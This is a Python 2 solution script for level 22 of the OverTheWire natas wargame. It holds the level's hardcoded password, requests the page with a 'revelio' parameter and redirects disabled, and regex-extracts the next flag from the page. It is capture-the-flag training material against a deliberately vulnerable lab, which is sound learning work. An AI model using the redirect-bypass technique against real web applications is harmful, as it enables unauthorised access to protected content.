#!/usr/bin/env python2
# -*- coding: utf-8 -*-
"""
  level22.py
  Solution for natas level22
"""
__author__ = 'kall.micke@gmail.com'

import requests
import datetime
import time
import sys
import os
import re

level = 22
user = 'natas%s' % level
host = 'http://natas%s.natas.labs.overthewire.org' % level
password = 'chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ'

def get_flag():
    params = dict(revelio=1)
    r = requests.get(host, params=params, auth=(user, password), allow_redirects=False)
    m = re.search(r'([A-Za-z0-9]{30,})', r.text[750:])
    return m.group()

if __name__ == '__main__':
    print("Flag: %s" % get_flag())
